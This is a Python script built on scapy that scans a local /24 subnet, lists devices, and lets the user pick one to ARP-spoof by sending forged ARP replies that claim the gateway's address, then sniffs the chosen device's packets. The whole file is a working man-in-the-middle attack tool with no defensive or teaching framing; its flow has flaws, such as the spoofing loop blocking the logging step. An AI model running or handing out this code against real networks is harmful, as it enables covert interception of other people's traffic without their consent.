from scapy.all import ARP, Ether, srp, send, sniff
import os
import time
import socket
import ipaddress

# Function to get network details based on a given IP
def get_network_details(ip):
    # Calculate subnet and gateway based on the given IP
    ip_addr = ipaddress.ip_address(ip)
    network = ipaddress.ip_network(f'{ip}/24', strict=False)  # Assuming /24 subnet for simplicity
    subnet = str(network.network_address) + '/' + str(network.prefixlen)
    gateway = network.network_address + 1  # Simple assumption for gateway (usually network address + 1)
    return subnet, str(gateway)

# Scan the network for active devices
def scan_network(subnet):
    print(f"Scanning the network {subnet}...")
    devices = []

    arp_request = ARP(pdst=subnet)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    for sent, received in answered_list:
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})

    return devices

# Display the list of devices
def display_devices(devices):
    print("Available devices on the network:")
    for i, device in enumerate(devices):
        print(f"{i+1}. IP: {device['ip']}, MAC: {device['mac']}")

# ARP spoofing to route traffic through the ARP proxy
def arp_spoof(target_ip, target_mac, gateway_ip, arp_device_mac):
    arp_reply = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=arp_device_mac)
    try:
        print(f"ARP spoofing {target_ip} to route traffic through this device...")
        while True:
            send(arp_reply, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        print("ARP spoofing stopped.")
        restore_arp(target_ip, gateway_ip)

# Restore the ARP table to its original state
def restore_arp(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    if target_mac and gateway_mac:
        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), count=5)
        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=5)
    print("ARP table restored.")

# Get the MAC address of a given IP address
def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    return answered_list[0][1].hwsrc if answered_list else None

# Sniff network packets from the selected device
def log_device_traffic(selected_device_ip):
    print(f"Logging traffic from {selected_device_ip}...")

    def packet_callback(packet):
        if packet.haslayer(ARP):
            print(f"ARP Packet from {packet[ARP].psrc}: {packet.summary()}")
        else:
            print(f"Packet from {selected_device_ip}: {packet.summary()}")

    sniff(filter=f"ip src {selected_device_ip}", prn=packet_callback, store=False)

# Main function to scan the network and ARP spoof selected devices
def main():
    # Manual IP input
    ip = input("Enter the IP address to use: ")

    # Automatically get the network subnet and gateway IP based on the provided IP
    subnet, gateway_ip = get_network_details(ip)
    
    print(f"Detected network subnet: {subnet}")
    print(f"Detected gateway IP: {gateway_ip}")

    # Scan the network for devices
    devices = scan_network(subnet)
    if not devices:
        print("No devices found on the network.")
        return

    # Display available devices
    display_devices(devices)
    
    # Select a device
    selection = input("Select the device number you want to ARP spoof: ")
    selected_device = devices[int(selection) - 1]
    target_ip = selected_device['ip']
    target_mac = selected_device['mac']

    gateway_mac = get_mac(gateway_ip)
    if not gateway_mac:
        print("Could not find the gateway MAC address.")
        return

    # Get the MAC address of the ARP proxy device (your device)
    arp_device_mac = get_mac(ip)

    # Start ARP spoofing in the background
    try:
        arp_spoof(target_ip, target_mac, gateway_ip, arp_device_mac)
    except Exception as e:
        print(f"Error: {e}")

    # Log all network requests from the selected device
    log_device_traffic(target_ip)

if __name__ == "__main__":
    main()
